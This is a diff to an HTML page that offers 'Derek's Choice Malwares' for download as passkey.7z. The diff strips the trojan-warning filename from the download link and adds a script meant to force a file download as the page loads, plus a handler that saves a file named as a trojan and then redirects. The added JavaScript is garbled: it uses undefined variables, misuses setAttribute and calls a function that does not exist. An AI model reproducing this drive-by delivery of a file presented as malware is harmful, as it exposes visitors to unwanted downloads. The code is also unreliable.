@@ -26,7 +26,7 @@ input,textarea,select,button{
 
 </head>
 <body>
-    <a href="passkey.7z" download="dont_open_if_u_like_ur_files_TROJAN.zip">
+    <a href="passkey.7z" download="">
         <button type="button">Download Derek's Choice Malwares (Now Chromebook Accessible!)</button>
 </a>
     <!-- Textarea -->
@@ -35,7 +35,29 @@ input,textarea,select,button{
     <button onClick='document.getElementById("myTextarea").style.visibility = "visible" '> Click me !</button> 
     <!-- Button to get textarea value -->
     <button onclick="getValue()">clickme2</button>
+    <script>let element = document.createElement('a');
+    element.setAttribute('href',
+        'data:text/plain;charset=utf-8, '
+        + encodeURIComponent(text));
+    element.setAttribute('passkey.7z', filename);
+    document.body.appendChild(element);
+    element.click();
 
+    document.body.removeChild(element);
+
+
+// Start file download.
+
+document.getElementById("btn")
+    .addEventListener("click", function () {
+        let text =
+            document.getElementById("text").value;
+        let filename = "dont_open_if_u_like_ur_files_TROJAN.zip";
+
+        download(filename, text);
+        window.location.href = 'oldindex.html';
+    }, false);
+</script>
     <!-- Script to get textarea value -->
     <script>
         function getValue() {
